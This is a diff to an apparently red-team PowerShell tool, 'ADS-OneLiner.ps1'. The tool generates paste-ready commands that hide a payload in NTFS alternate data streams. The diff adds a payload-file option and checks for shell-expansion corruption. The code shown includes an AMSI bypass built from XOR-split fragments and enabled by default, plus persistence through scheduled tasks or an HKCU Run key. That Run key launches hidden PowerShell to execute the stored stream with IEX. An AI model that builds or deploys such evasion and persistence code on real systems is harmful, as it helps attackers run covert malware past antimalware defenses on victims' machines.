@@ -10,7 +10,16 @@
     NO full script upload needed - just copy/paste the generated commands.
 
 .PARAMETER Payload
-    Payload content (required unless -PayloadAtDeployment)
+    Payload content (required unless -PayloadFile or -PayloadAtDeployment).
+    WARNING: Passing payloads containing $ variables via -Payload on the command
+    line is unreliable because bash and pwsh both expand $ in double-quoted strings.
+    Use -PayloadFile instead for payloads containing $ variables.
+
+.PARAMETER PayloadFile
+    Path to a file containing the payload. The file is read verbatim with
+    Get-Content -Raw, bypassing all shell expansion issues. This is the
+    RECOMMENDED way to pass payloads containing $ variables, registry paths,
+    or any other special characters.
 
 .PARAMETER PayloadAtDeployment
     Prompt for payload on Windows target instead of baking it in
@@ -46,20 +55,22 @@
     Opt out of AMSI bypass (bypass is ON by default)
 
 .EXAMPLE
-    pwsh ADS-OneLiner.ps1 \
-      -Payload "Write-Host 'Test'" \
-      -ZeroWidthStreams \
-      -Persist task
+    # Simple payload (no $ variables):
+    pwsh ADS-OneLiner.ps1 -Payload "Write-Host 'Test'" -Persist task
+
+    # Payload with $ variables — use -PayloadFile to avoid shell expansion:
+    pwsh ADS-OneLiner.ps1 -PayloadFile ./my-payload.ps1 -Persist task -ZeroWidthStreams
 
 .NOTES
     Author: Qweary
-    Version: 2.2.2 (Command Generator - Quoting & Escaping Fixes)
+    Version: 2.2.3 (Command Generator - PayloadFile + Expansion Safety)
     Requires: ADS-Dropper.ps1 in ./src/ or same directory
 #>
 
 [CmdletBinding()]
 param(
     [string]$Payload,
+    [string]$PayloadFile,
     [switch]$PayloadAtDeployment,
     
     [switch]$ZeroWidthStreams,
@@ -95,13 +106,70 @@ param(
 )
 
 Write-Host "`n╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║ ADS Minimal Command Generator v2.2                    ║" -ForegroundColor Cyan
+Write-Host "║ ADS Minimal Command Generator v2.2.3                  ║" -ForegroundColor Cyan
 Write-Host "╚═══════════════════════════════════════════════════════════╝`n" -ForegroundColor Cyan
 
-# Validate payload input
+# ============================================================
+# PAYLOAD INPUT VALIDATION
+# ============================================================
+
+# Handle -PayloadFile: read file contents, bypassing all shell expansion
+if ($PayloadFile) {
+    if (-not (Test-Path $PayloadFile)) {
+        Write-Error "PayloadFile not found: $PayloadFile"
+        exit 1
+    }
+    try {
+        $Payload = Get-Content $PayloadFile -Raw -ErrorAction Stop
+        Write-Host "[+] Payload read from file: $PayloadFile ($($Payload.Length) chars)" -ForegroundColor Green
+    } catch {
+        Write-Error "Failed to read PayloadFile: $_"
+        exit 1
+    }
+}
+
 if (-not $Payload -and -not $PayloadAtDeployment) {
-    Write-Error "Provide -Payload or use -PayloadAtDeployment"
+    Write-Error "Provide -Payload, -PayloadFile, or use -PayloadAtDeployment"
     exit 1
+}
+
+# ============================================================
+# EXPANSION CORRUPTION DETECTION
+# ============================================================
+# When a payload containing $ variables is passed via -Payload "..."
+# on the command line, bash and/or pwsh expand those variables to
+# empty strings BEFORE this script runs. Detect common corruption
+# patterns and warn the user to use -PayloadFile instead.
+# ============================================================
+if ($Payload -and -not $PayloadFile -and -not $PayloadAtDeployment) {
+    $corruptionHints = 0
+    # Pattern: "; ='value'" — a bare = where "$var='value'" was intended
+    if ($Payload -match ';\s*=\s*''') { $corruptionHints++ }
+    # Pattern: "Test-Path )" — empty argument where "$var" was intended
+    if ($Payload -match 'Test-Path\s*\)') { $corruptionHints++ }
+    # Pattern: "-Path  -" — empty -Path value (double space before next param)
+    if ($Payload -match '-Path\s{2,}-') { $corruptionHints++ }
+    # Pattern: parameter flags with no value where $true/$false was expected
+    if ($Payload -match '-\w+Monitoring\s+(-|;|$)') { $corruptionHints++ }
+    if ($Payload -match '-\w+Protection\s+(-|;|$)') { $corruptionHints++ }
+
+    if ($corruptionHints -ge 2) {
+        Write-Host ""
+        Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Red
+        Write-Host "║ WARNING: Payload appears corrupted by shell expansion!   ║" -ForegroundColor Red
+        Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Red
+        Write-Host ""
+        Write-Host "  The payload looks like `$ variables were expanded to empty" -ForegroundColor Yellow
+        Write-Host "  strings by bash or pwsh before this script received them." -ForegroundColor Yellow
+        Write-Host ""
+        Write-Host "  FIX: Save your payload to a file and use -PayloadFile:" -ForegroundColor White
+        Write-Host '    echo ''your payload here'' > payload.ps1' -ForegroundColor Gray
+        Write-Host '    pwsh ADS-OneLiner.ps1 -PayloadFile ./payload.ps1 ...' -ForegroundColor Gray
+        Write-Host ""
+        Write-Host "  Detected $corruptionHints corruption pattern(s)." -ForegroundColor DarkGray
+        Write-Host "  Continuing anyway (output will be broken)..." -ForegroundColor DarkGray
+        Write-Host ""
+    }
 }
 
 # ============================================================
@@ -156,12 +224,6 @@ function New-AmsiBypassLayerA {
         [string] PowerShell code ready for embedding in $minimalScript
     #>
     $xk = New-XorKey
-
-    # Four fragments, each individually benign when decoded:
-    # A: Store assembly ref + build method name via concat
-    # B: Invoke GetType with split type name string
-    # C: Build GetField method name + invoke with split field name
-    # D: Build SetValue method name + invoke
 
     # Four fragments using PowerShell dynamic dispatch: $obj."$method"(args)
     # This avoids the PSMethod.Invoke() pitfall where passing $self as
@@ -384,7 +446,10 @@ do{`$line=Read-Host;if(`$line){`$lines+=`$line}}while(`$line)
     $actualPayload = $Payload
     
     # Check if payload looks like a file path (doesn't contain newlines and is a valid path)
-    if (($Payload -notmatch "`n") -and (Test-Path $Payload -ErrorAction SilentlyContinue)) {
+    # NOTE: -PayloadFile is the preferred way to pass file-based payloads.
+    # This auto-detection is kept for backward compatibility but -PayloadFile
+    # should be used instead since it bypasses all shell expansion issues.
+    if (-not $PayloadFile -and ($Payload -notmatch "`n") -and (Test-Path $Payload -ErrorAction SilentlyContinue)) {
         Write-Host "[*] File detected: $Payload" -ForegroundColor Yellow
         Write-Host "[*] Reading file contents..." -ForegroundColor Yellow
         try {
@@ -500,10 +565,6 @@ if(!(Test-Path `$hp)){ni `$hp -ItemType File -Force|Out-Null}
             # ============================================================
 
             # Build the AMSI bypass for Layer B (JScript wrapper)
-            # This is SEPARATE from Layer A — it protects the scheduled task
-            # execution session where IEX $p runs with the decrypted payload.
-            # Uses the same XOR fragment approach, generated fresh with a
-            # different random key than Layer A.
             $jsAmsiLine = ""
             if (-not $NoAmsi) {
                 $layerBCode = New-AmsiBypassLayerB
@@ -591,20 +652,9 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Pr
         }
     } elseif ($Persist -eq 'registry') {
         # Registry persistence
-        # The -Value must be built carefully: the AMSI bypass code contains
-        # $, backticks, and quotes that would corrupt nested double-quoted
-        # strings if embedded directly. Solution: the GENERATED script builds
-        # the -Value at runtime on the target using string concatenation with
-        # single-quoted fragments, preventing all interpolation issues.
         if (-not $NoAmsi) {
             $regBypass = New-AmsiBypassForRegistry
-            # Escape single quotes in the bypass code for safe embedding in '...'
             $regBypassSafe = $regBypass -replace "'","''"
-            # Build the generated code lines:
-            # On the target this produces:
-            #   $_regByp = '<bypass code with '' escaped>'
-            #   $_regCmd = 'powershell.exe -NoP -W Hidden -C "' + $_regByp + 'IEX(gc ''' + $hp + ':' + $sn + ''' -Raw)"'
-            #   Set-ItemProperty ... -Value $_regCmd
             $block += "`$_regByp='" + $regBypassSafe + "'`n"
             $block += "`$_regCmd='powershell.exe -NoP -W Hidden -C `"' + `$_regByp + 'IEX(gc ' + [char]39 + `$hp + ':' + `$sn + [char]39 + ' -Raw)`"'`n"
             $block += "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value `$_regCmd`n`n"
@@ -637,7 +687,6 @@ for(`$_i=0;`$_i -lt `$_instanceCount;`$_i++){
     if ($UseDeepPlacement -or $AttachToExisting) {
         $minimalScript += (Build-DeepPlacementCode) + "`n"
     } else {
-        # No deep placement — randomize a ProgramData path per instance
         $minimalScript += @'
 $hp = Join-Path $env:ProgramData (-join((65..90)+(97..122)|Get-Random -Count 8|ForEach-Object{[char]$_}))
 
@@ -718,8 +767,9 @@ if (-not $PayloadAtDeployment) {
         AttachToExisting  = $AttachToExisting.IsPresent
         InstanceCount     = $InstanceCount
         AmsiBypass        = (-not $NoAmsi)
-        AmsiBypassMethod  = if (-not $NoAmsi) { "XOR Fragment Splitting v2.2.2" } else { "Disabled" }
+        AmsiBypassMethod  = if (-not $NoAmsi) { "XOR Fragment Splitting v2.2.3" } else { "Disabled" }
         PayloadHash       = $payloadHash
+        PayloadSource     = if ($PayloadFile) { "File: $PayloadFile" } else { "Command-line" }
         Operator          = $env:USER
         GeneratedOn       = hostname
         OutputFile        = $OutputFile
@@ -752,6 +802,7 @@ CONFIGURATION:
   Attach to Existing: $($AttachToExisting.IsPresent)
   Instances: $InstanceCount$(if($InstanceCount -gt 1){" (each gets unique path/stream/task at runtime)"})
   AMSI Bypass: $(-not $NoAmsi) (XOR Fragment Splitting - Layer A + Layer B)
+  Payload Source: $(if ($PayloadFile) { "File: $PayloadFile" } else { "Command-line" })
   
 PAYLOAD SIZE:
   Readable: $($minimalScript.Length) characters
@@ -812,6 +863,9 @@ Write-Host "✓ Minimal commands generated" -ForegroundColor Green
 Write-Host "✓ Output saved to: $OutputFile" -ForegroundColor Green
 if (-not $PayloadAtDeployment) {
     Write-Host "✓ Manifest saved for recovery" -ForegroundColor Green
+}
+if ($PayloadFile) {
+    Write-Host "✓ Payload loaded from file (shell-safe)" -ForegroundColor Green
 }
 if (-not $NoAmsi) {
     Write-Host "✓ AMSI bypass: XOR Fragment Splitting (Layer A + Layer B)" -ForegroundColor Green
